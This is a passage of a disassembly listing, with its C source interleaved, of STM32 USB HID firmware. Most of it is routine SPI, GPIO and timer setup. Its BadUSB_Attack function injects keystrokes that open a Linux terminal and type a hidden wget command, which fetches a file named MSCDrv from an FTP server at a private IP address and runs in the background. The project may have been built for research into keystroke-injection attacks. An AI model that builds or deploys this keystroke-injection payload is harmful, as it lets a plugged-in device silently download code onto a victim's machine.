 8000a60:	f022 0208 	bic.w	r2, r2, #8
 8000a64:	b2d2      	uxtb	r2, r2
 8000a66:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 8000a68:	7bfb      	ldrb	r3, [r7, #15]
 8000a6a:	3320      	adds	r3, #32
 8000a6c:	687a      	ldr	r2, [r7, #4]
 8000a6e:	4413      	add	r3, r2
 8000a70:	781a      	ldrb	r2, [r3, #0]
 8000a72:	7bfb      	ldrb	r3, [r7, #15]
 8000a74:	3320      	adds	r3, #32
 8000a76:	6879      	ldr	r1, [r7, #4]
 8000a78:	440b      	add	r3, r1
 8000a7a:	f042 0208 	orr.w	r2, r2, #8
 8000a7e:	b2d2      	uxtb	r2, r2
 8000a80:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a82:	7bfb      	ldrb	r3, [r7, #15]
 8000a84:	3301      	adds	r3, #1
 8000a86:	73fb      	strb	r3, [r7, #15]
 8000a88:	7bfb      	ldrb	r3, [r7, #15]
 8000a8a:	2b5a      	cmp	r3, #90	; 0x5a
 8000a8c:	d9e1      	bls.n	8000a52 <Convert2CapsMap+0xe>
	}
}
 8000a8e:	bf00      	nop
 8000a90:	bf00      	nop
 8000a92:	3714      	adds	r7, #20
 8000a94:	46bd      	mov	sp, r7
 8000a96:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a9a:	4770      	bx	lr

08000a9c <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000a9c:	b580      	push	{r7, lr}
 8000a9e:	b082      	sub	sp, #8
 8000aa0:	af00      	add	r7, sp, #0
 8000aa2:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000aa4:	687b      	ldr	r3, [r7, #4]
 8000aa6:	681b      	ldr	r3, [r3, #0]
 8000aa8:	2b01      	cmp	r3, #1
 8000aaa:	d10f      	bne.n	8000acc <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000aac:	687b      	ldr	r3, [r7, #4]
 8000aae:	2200      	movs	r2, #0
 8000ab0:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000ab2:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000ab6:	695b      	ldr	r3, [r3, #20]
 8000ab8:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000abc:	f043 0301 	orr.w	r3, r3, #1
 8000ac0:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000ac2:	f000 fa01 	bl	8000ec8 <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000ac6:	4803      	ldr	r0, [pc, #12]	; (8000ad4 <InterruptTrap+0x38>)
 8000ac8:	f004 f94a 	bl	8004d60 <HAL_TIM_Base_Start_IT>
	}
}
 8000acc:	bf00      	nop
 8000ace:	3708      	adds	r7, #8
 8000ad0:	46bd      	mov	sp, r7
 8000ad2:	bd80      	pop	{r7, pc}
 8000ad4:	200002e4 	.word	0x200002e4

08000ad8 <TestHID>:

int TestHID(){
 8000ad8:	b580      	push	{r7, lr}
 8000ada:	b082      	sub	sp, #8
 8000adc:	af00      	add	r7, sp, #0
	SimulateKeyStroke(128);
 8000ade:	2080      	movs	r0, #128	; 0x80
 8000ae0:	f7ff ff30 	bl	8000944 <SimulateKeyStroke>
	uint8_t PrevState = recv_buffer[0]&0x02;
 8000ae4:	4b10      	ldr	r3, [pc, #64]	; (8000b28 <TestHID+0x50>)
 8000ae6:	781b      	ldrb	r3, [r3, #0]
 8000ae8:	f003 0302 	and.w	r3, r3, #2
 8000aec:	70fb      	strb	r3, [r7, #3]
	for(int i = 0; i < 4; i++)
 8000aee:	2300      	movs	r3, #0
 8000af0:	607b      	str	r3, [r7, #4]
 8000af2:	e005      	b.n	8000b00 <TestHID+0x28>
		SimulateKeyStroke(128);
 8000af4:	2080      	movs	r0, #128	; 0x80
 8000af6:	f7ff ff25 	bl	8000944 <SimulateKeyStroke>
	for(int i = 0; i < 4; i++)
 8000afa:	687b      	ldr	r3, [r7, #4]
 8000afc:	3301      	adds	r3, #1
 8000afe:	607b      	str	r3, [r7, #4]
 8000b00:	687b      	ldr	r3, [r7, #4]
 8000b02:	2b03      	cmp	r3, #3
 8000b04:	ddf6      	ble.n	8000af4 <TestHID+0x1c>
	uint8_t CurrState = recv_buffer[0]&0x02;
 8000b06:	4b08      	ldr	r3, [pc, #32]	; (8000b28 <TestHID+0x50>)
 8000b08:	781b      	ldrb	r3, [r3, #0]
 8000b0a:	f003 0302 	and.w	r3, r3, #2
 8000b0e:	70bb      	strb	r3, [r7, #2]
	return PrevState == CurrState;
 8000b10:	78fa      	ldrb	r2, [r7, #3]
 8000b12:	78bb      	ldrb	r3, [r7, #2]
 8000b14:	429a      	cmp	r2, r3
 8000b16:	bf0c      	ite	eq
 8000b18:	2301      	moveq	r3, #1
 8000b1a:	2300      	movne	r3, #0
 8000b1c:	b2db      	uxtb	r3, r3
}
 8000b1e:	4618      	mov	r0, r3
 8000b20:	3708      	adds	r7, #8
 8000b22:	46bd      	mov	sp, r7
 8000b24:	bd80      	pop	{r7, pc}
 8000b26:	bf00      	nop
 8000b28:	2000026c 	.word	0x2000026c

08000b2c <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 8000b2c:	b580      	push	{r7, lr}
 8000b2e:	b0c4      	sub	sp, #272	; 0x110
 8000b30:	af00      	add	r7, sp, #0
 8000b32:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b36:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b3a:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 8000b3c:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b40:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b44:	681b      	ldr	r3, [r3, #0]
 8000b46:	2b00      	cmp	r3, #0
 8000b48:	d125      	bne.n	8000b96 <BadUSB_Attack+0x6a>
		uint8_t Terminal[3] = LinuxTerminal;
 8000b4a:	4a37      	ldr	r2, [pc, #220]	; (8000c28 <BadUSB_Attack+0xfc>)
 8000b4c:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b50:	6812      	ldr	r2, [r2, #0]
 8000b52:	4611      	mov	r1, r2
 8000b54:	8019      	strh	r1, [r3, #0]
 8000b56:	3302      	adds	r3, #2
 8000b58:	0c12      	lsrs	r2, r2, #16
 8000b5a:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256];
		strcpy(AttackStr0,
 8000b5c:	f107 0308 	add.w	r3, r7, #8
 8000b60:	4a32      	ldr	r2, [pc, #200]	; (8000c2c <BadUSB_Attack+0x100>)
 8000b62:	4618      	mov	r0, r3
 8000b64:	4611      	mov	r1, r2
 8000b66:	235f      	movs	r3, #95	; 0x5f
 8000b68:	461a      	mov	r2, r3
 8000b6a:	f00c fa8d 	bl	800d088 <memcpy>
				"cd /home/user/Templates\nwget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\nexit\n");
		SimulateShortcutKey(Terminal, 3);
 8000b6e:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000b72:	2103      	movs	r1, #3
 8000b74:	4618      	mov	r0, r3
 8000b76:	f7ff fefb 	bl	8000970 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000b7a:	f107 0308 	add.w	r3, r7, #8
 8000b7e:	4618      	mov	r0, r3
 8000b80:	f7ff fb24 	bl	80001cc <strlen>
 8000b84:	4603      	mov	r3, r0
 8000b86:	4619      	mov	r1, r3
 8000b88:	f107 0308 	add.w	r3, r7, #8
 8000b8c:	4a28      	ldr	r2, [pc, #160]	; (8000c30 <BadUSB_Attack+0x104>)
 8000b8e:	4618      	mov	r0, r3
 8000b90:	f7ff ff1a 	bl	80009c8 <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000b94:	e042      	b.n	8000c1c <BadUSB_Attack+0xf0>
	}else if(stage == 1){
 8000b96:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b9a:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b9e:	681b      	ldr	r3, [r3, #0]
 8000ba0:	2b01      	cmp	r3, #1
 8000ba2:	d125      	bne.n	8000bf0 <BadUSB_Attack+0xc4>
		uint8_t Terminal[3] = LinuxTerminal;
 8000ba4:	4a20      	ldr	r2, [pc, #128]	; (8000c28 <BadUSB_Attack+0xfc>)
 8000ba6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000baa:	6812      	ldr	r2, [r2, #0]
 8000bac:	4611      	mov	r1, r2
 8000bae:	8019      	strh	r1, [r3, #0]
 8000bb0:	3302      	adds	r3, #2
 8000bb2:	0c12      	lsrs	r2, r2, #16
 8000bb4:	701a      	strb	r2, [r3, #0]
		strcpy(AttackStr1,
 8000bb6:	f107 0308 	add.w	r3, r7, #8
 8000bba:	4a1e      	ldr	r2, [pc, #120]	; (8000c34 <BadUSB_Attack+0x108>)
 8000bbc:	4618      	mov	r0, r3
 8000bbe:	4611      	mov	r1, r2
 8000bc0:	234a      	movs	r3, #74	; 0x4a
 8000bc2:	461a      	mov	r2, r3
 8000bc4:	f00c fa60 	bl	800d088 <memcpy>
		SimulateShortcutKey(Terminal, 3);
 8000bc8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000bcc:	2103      	movs	r1, #3
 8000bce:	4618      	mov	r0, r3
 8000bd0:	f7ff fece 	bl	8000970 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000bd4:	f107 0308 	add.w	r3, r7, #8
 8000bd8:	4618      	mov	r0, r3
 8000bda:	f7ff faf7 	bl	80001cc <strlen>
 8000bde:	4603      	mov	r3, r0
 8000be0:	4619      	mov	r1, r3
 8000be2:	f107 0308 	add.w	r3, r7, #8
 8000be6:	4a12      	ldr	r2, [pc, #72]	; (8000c30 <BadUSB_Attack+0x104>)
 8000be8:	4618      	mov	r0, r3
 8000bea:	f7ff feed 	bl	80009c8 <SimulateKeyStrokes>
}
 8000bee:	e015      	b.n	8000c1c <BadUSB_Attack+0xf0>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000bf0:	f107 0308 	add.w	r3, r7, #8
 8000bf4:	4a10      	ldr	r2, [pc, #64]	; (8000c38 <BadUSB_Attack+0x10c>)
 8000bf6:	4618      	mov	r0, r3
 8000bf8:	4611      	mov	r1, r2
 8000bfa:	234e      	movs	r3, #78	; 0x4e
 8000bfc:	461a      	mov	r2, r3
 8000bfe:	f00c fa43 	bl	800d088 <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000c02:	f107 0308 	add.w	r3, r7, #8
 8000c06:	4618      	mov	r0, r3
 8000c08:	f7ff fae0 	bl	80001cc <strlen>
 8000c0c:	4603      	mov	r3, r0
 8000c0e:	4619      	mov	r1, r3
 8000c10:	f107 0308 	add.w	r3, r7, #8
 8000c14:	4a06      	ldr	r2, [pc, #24]	; (8000c30 <BadUSB_Attack+0x104>)
 8000c16:	4618      	mov	r0, r3
 8000c18:	f7ff fed6 	bl	80009c8 <SimulateKeyStrokes>
}
 8000c1c:	bf00      	nop
 8000c1e:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000c22:	46bd      	mov	sp, r7
 8000c24:	bd80      	pop	{r7, pc}
 8000c26:	bf00      	nop
 8000c28:	0800d240 	.word	0x0800d240
 8000c2c:	0800d144 	.word	0x0800d144
 8000c30:	20000278 	.word	0x20000278
 8000c34:	0800d1a4 	.word	0x0800d1a4
 8000c38:	0800d1f0 	.word	0x0800d1f0

08000c3c <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000c3c:	b580      	push	{r7, lr}
 8000c3e:	b082      	sub	sp, #8
 8000c40:	af00      	add	r7, sp, #0
 8000c42:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000c44:	687b      	ldr	r3, [r7, #4]
 8000c46:	4a1d      	ldr	r2, [pc, #116]	; (8000cbc <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000c48:	4293      	cmp	r3, r2
 8000c4a:	d133      	bne.n	8000cb4 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000c4c:	4b1c      	ldr	r3, [pc, #112]	; (8000cc0 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c4e:	681b      	ldr	r3, [r3, #0]
 8000c50:	2b00      	cmp	r3, #0
 8000c52:	d108      	bne.n	8000c66 <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000c54:	2080      	movs	r0, #128	; 0x80
 8000c56:	f7ff fd9f 	bl	8000798 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000c5a:	220f      	movs	r2, #15
 8000c5c:	4919      	ldr	r1, [pc, #100]	; (8000cc4 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000c5e:	481a      	ldr	r0, [pc, #104]	; (8000cc8 <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000c60:	f007 feec 	bl	8008a3c <USBD_CUSTOM_HID_SendReport>
 8000c64:	e018      	b.n	8000c98 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000c66:	4b16      	ldr	r3, [pc, #88]	; (8000cc0 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c68:	681b      	ldr	r3, [r3, #0]
 8000c6a:	2b01      	cmp	r3, #1
 8000c6c:	d10c      	bne.n	8000c88 <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000c6e:	f7ff fe57 	bl	8000920 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000c72:	4b16      	ldr	r3, [pc, #88]	; (8000ccc <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000c74:	781b      	ldrb	r3, [r3, #0]
 8000c76:	f003 0302 	and.w	r3, r3, #2
 8000c7a:	2b00      	cmp	r3, #0
 8000c7c:	d10c      	bne.n	8000c98 <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000c7e:	4b10      	ldr	r3, [pc, #64]	; (8000cc0 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c80:	f04f 32ff 	mov.w	r2, #4294967295
 8000c84:	601a      	str	r2, [r3, #0]
 8000c86:	e007      	b.n	8000c98 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000c88:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000c8c:	681b      	ldr	r3, [r3, #0]
 8000c8e:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000c92:	f023 0301 	bic.w	r3, r3, #1
 8000c96:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000c98:	4b09      	ldr	r3, [pc, #36]	; (8000cc0 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c9a:	681b      	ldr	r3, [r3, #0]
 8000c9c:	1c59      	adds	r1, r3, #1
 8000c9e:	4b0c      	ldr	r3, [pc, #48]	; (8000cd0 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000ca0:	fb83 3201 	smull	r3, r2, r3, r1
 8000ca4:	17cb      	asrs	r3, r1, #31
 8000ca6:	1ad2      	subs	r2, r2, r3
 8000ca8:	4613      	mov	r3, r2
 8000caa:	005b      	lsls	r3, r3, #1
 8000cac:	4413      	add	r3, r2
 8000cae:	1aca      	subs	r2, r1, r3
 8000cb0:	4b03      	ldr	r3, [pc, #12]	; (8000cc0 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000cb2:	601a      	str	r2, [r3, #0]
	}
}
 8000cb4:	bf00      	nop
 8000cb6:	3708      	adds	r7, #8
 8000cb8:	46bd      	mov	sp, r7
 8000cba:	bd80      	pop	{r7, pc}
 8000cbc:	200002e4 	.word	0x200002e4
 8000cc0:	20000274 	.word	0x20000274
 8000cc4:	2000025c 	.word	0x2000025c
 8000cc8:	200003c0 	.word	0x200003c0
 8000ccc:	2000026c 	.word	0x2000026c
 8000cd0:	55555556 	.word	0x55555556

08000cd4 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000cd4:	b480      	push	{r7}
 8000cd6:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000cd8:	b672      	cpsid	i
}
 8000cda:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000cdc:	e7fe      	b.n	8000cdc <Error_Handler+0x8>
	...

08000ce0 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000ce0:	b580      	push	{r7, lr}
 8000ce2:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000ce4:	4b1b      	ldr	r3, [pc, #108]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000ce6:	4a1c      	ldr	r2, [pc, #112]	; (8000d58 <MX_SPI1_Init+0x78>)
 8000ce8:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000cea:	4b1a      	ldr	r3, [pc, #104]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000cec:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000cf0:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000cf2:	4b18      	ldr	r3, [pc, #96]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000cf4:	2200      	movs	r2, #0
 8000cf6:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000cf8:	4b16      	ldr	r3, [pc, #88]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000cfa:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000cfe:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000d00:	4b14      	ldr	r3, [pc, #80]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d02:	2200      	movs	r2, #0
 8000d04:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000d06:	4b13      	ldr	r3, [pc, #76]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d08:	2200      	movs	r2, #0
 8000d0a:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000d0c:	4b11      	ldr	r3, [pc, #68]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d0e:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000d12:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000d14:	4b0f      	ldr	r3, [pc, #60]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d16:	2228      	movs	r2, #40	; 0x28
 8000d18:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000d1a:	4b0e      	ldr	r3, [pc, #56]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d1c:	2200      	movs	r2, #0
 8000d1e:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000d20:	4b0c      	ldr	r3, [pc, #48]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d22:	2200      	movs	r2, #0
 8000d24:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000d26:	4b0b      	ldr	r3, [pc, #44]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d28:	2200      	movs	r2, #0
 8000d2a:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000d2c:	4b09      	ldr	r3, [pc, #36]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d2e:	2207      	movs	r2, #7
 8000d30:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000d32:	4b08      	ldr	r3, [pc, #32]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d34:	2200      	movs	r2, #0
 8000d36:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000d38:	4b06      	ldr	r3, [pc, #24]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d3a:	2208      	movs	r2, #8
 8000d3c:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000d3e:	4805      	ldr	r0, [pc, #20]	; (8000d54 <MX_SPI1_Init+0x74>)
 8000d40:	f003 ff14 	bl	8004b6c <HAL_SPI_Init>
 8000d44:	4603      	mov	r3, r0
 8000d46:	2b00      	cmp	r3, #0
 8000d48:	d001      	beq.n	8000d4e <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000d4a:	f7ff ffc3 	bl	8000cd4 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000d4e:	bf00      	nop
 8000d50:	bd80      	pop	{r7, pc}
 8000d52:	bf00      	nop
 8000d54:	20000280 	.word	0x20000280
 8000d58:	40013000 	.word	0x40013000

08000d5c <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000d5c:	b580      	push	{r7, lr}
 8000d5e:	b08a      	sub	sp, #40	; 0x28
 8000d60:	af00      	add	r7, sp, #0
 8000d62:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000d64:	f107 0314 	add.w	r3, r7, #20
 8000d68:	2200      	movs	r2, #0
 8000d6a:	601a      	str	r2, [r3, #0]
 8000d6c:	605a      	str	r2, [r3, #4]
 8000d6e:	609a      	str	r2, [r3, #8]
 8000d70:	60da      	str	r2, [r3, #12]
 8000d72:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000d74:	687b      	ldr	r3, [r7, #4]
 8000d76:	681b      	ldr	r3, [r3, #0]
 8000d78:	4a17      	ldr	r2, [pc, #92]	; (8000dd8 <HAL_SPI_MspInit+0x7c>)
 8000d7a:	4293      	cmp	r3, r2
 8000d7c:	d128      	bne.n	8000dd0 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000d7e:	4b17      	ldr	r3, [pc, #92]	; (8000ddc <HAL_SPI_MspInit+0x80>)
 8000d80:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d82:	4a16      	ldr	r2, [pc, #88]	; (8000ddc <HAL_SPI_MspInit+0x80>)
 8000d84:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000d88:	6613      	str	r3, [r2, #96]	; 0x60
 8000d8a:	4b14      	ldr	r3, [pc, #80]	; (8000ddc <HAL_SPI_MspInit+0x80>)
 8000d8c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d8e:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000d92:	613b      	str	r3, [r7, #16]
 8000d94:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000d96:	4b11      	ldr	r3, [pc, #68]	; (8000ddc <HAL_SPI_MspInit+0x80>)
 8000d98:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d9a:	4a10      	ldr	r2, [pc, #64]	; (8000ddc <HAL_SPI_MspInit+0x80>)
 8000d9c:	f043 0301 	orr.w	r3, r3, #1
 8000da0:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000da2:	4b0e      	ldr	r3, [pc, #56]	; (8000ddc <HAL_SPI_MspInit+0x80>)
 8000da4:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000da6:	f003 0301 	and.w	r3, r3, #1
 8000daa:	60fb      	str	r3, [r7, #12]
 8000dac:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000dae:	23c2      	movs	r3, #194	; 0xc2
 8000db0:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000db2:	2302      	movs	r3, #2
 8000db4:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000db6:	2300      	movs	r3, #0
 8000db8:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000dba:	2303      	movs	r3, #3
 8000dbc:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000dbe:	2305      	movs	r3, #5
 8000dc0:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000dc2:	f107 0314 	add.w	r3, r7, #20
 8000dc6:	4619      	mov	r1, r3
 8000dc8:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000dcc:	f000 fdd4 	bl	8001978 <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000dd0:	bf00      	nop
 8000dd2:	3728      	adds	r7, #40	; 0x28
 8000dd4:	46bd      	mov	sp, r7
 8000dd6:	bd80      	pop	{r7, pc}
 8000dd8:	40013000 	.word	0x40013000
 8000ddc:	40021000 	.word	0x40021000

08000de0 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000de0:	b480      	push	{r7}
 8000de2:	b083      	sub	sp, #12
 8000de4:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000de6:	4b0f      	ldr	r3, [pc, #60]	; (8000e24 <HAL_MspInit+0x44>)
 8000de8:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000dea:	4a0e      	ldr	r2, [pc, #56]	; (8000e24 <HAL_MspInit+0x44>)
 8000dec:	f043 0301 	orr.w	r3, r3, #1
 8000df0:	6613      	str	r3, [r2, #96]	; 0x60
 8000df2:	4b0c      	ldr	r3, [pc, #48]	; (8000e24 <HAL_MspInit+0x44>)
 8000df4:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000df6:	f003 0301 	and.w	r3, r3, #1
 8000dfa:	607b      	str	r3, [r7, #4]
 8000dfc:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000dfe:	4b09      	ldr	r3, [pc, #36]	; (8000e24 <HAL_MspInit+0x44>)
 8000e00:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000e02:	4a08      	ldr	r2, [pc, #32]	; (8000e24 <HAL_MspInit+0x44>)
 8000e04:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000e08:	6593      	str	r3, [r2, #88]	; 0x58
 8000e0a:	4b06      	ldr	r3, [pc, #24]	; (8000e24 <HAL_MspInit+0x44>)
 8000e0c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000e0e:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000e12:	603b      	str	r3, [r7, #0]
 8000e14:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000e16:	bf00      	nop
 8000e18:	370c      	adds	r7, #12
 8000e1a:	46bd      	mov	sp, r7
 8000e1c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e20:	4770      	bx	lr
 8000e22:	bf00      	nop
 8000e24:	40021000 	.word	0x40021000

08000e28 <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000e28:	b480      	push	{r7}
 8000e2a:	af00      	add	r7, sp, #0
